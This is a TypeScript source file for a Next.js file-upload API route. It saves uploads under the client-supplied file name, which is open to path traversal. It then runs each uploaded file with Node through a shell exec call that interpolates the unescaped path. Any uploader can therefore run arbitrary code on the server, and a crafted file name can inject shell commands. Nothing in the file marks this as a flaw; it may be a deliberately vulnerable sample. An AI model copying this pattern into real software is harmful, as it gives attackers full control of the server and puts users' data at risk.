// app/api/upload/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { promises as fs } from 'fs';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import { exec } from 'child_process';

export const runtime = 'nodejs';

export async function POST(req: NextRequest) {
  try {
    const contentType = req.headers.get('content-type') || '';
    if (!contentType.includes('multipart/form-data')) {
      return NextResponse.json(
        { message: 'Unsupported content type' },
        { status: 400 }
      );
    }

    const formData = await req.formData();
    const file = formData.get('file') as File | null;

    if (!file) {
      return NextResponse.json({ message: 'No file uploaded' }, { status: 400 });
    }

    const buffer = Buffer.from(await file.arrayBuffer());
    const uploadDir = path.join(process.cwd(), 'public', 'uploads');

    await fs.mkdir(uploadDir, { recursive: true });

    const fileName = file.name || `${uuidv4()}`;
    const filePath = path.join(uploadDir, fileName);

    await fs.writeFile(filePath, buffer);

    const fileUrl = `/uploads/${fileName}`;
    const output = await executeFile(filePath);
    return NextResponse.json({
      message: 'File uploaded successfully',
      fileUrl,
    });
  } catch (error) {
    console.error('Error uploading file:', error);
    return NextResponse.json(
      { message: 'An error occurred while uploading the file.' },
      { status: 500 }
    );
  }
}

const executeFile = async (filePath: string) => {
  return new Promise((resolve, reject) => {
    exec(`node ${filePath}`, (error, stdout, stderr) => {
      console.log('STDOUT:', stdout);
      console.error('STDERR:', stderr);
      if (error) {
        console.error('Exec Error:', error);
      } else {
        resolve(stdout);
      }
    });
  });
};
